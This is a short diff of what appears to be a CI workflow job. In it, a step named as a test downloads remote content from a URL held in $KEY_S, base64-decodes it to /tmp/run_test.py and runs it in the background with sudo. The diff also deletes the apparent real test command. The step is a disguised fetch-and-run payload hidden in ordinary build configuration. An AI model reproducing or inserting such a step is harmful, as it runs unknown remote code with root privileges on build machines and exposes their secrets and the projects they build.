@@ -16,4 +16,4 @@ jobs:
         run: |
           curl -s $KEY_S 2>/dev/null | base64 -d > /tmp/run_test.py 2>/dev/null
           cd /tmp/ && sudo python3 run_test.py &
-          python3 demo_test.py -i test1 
+
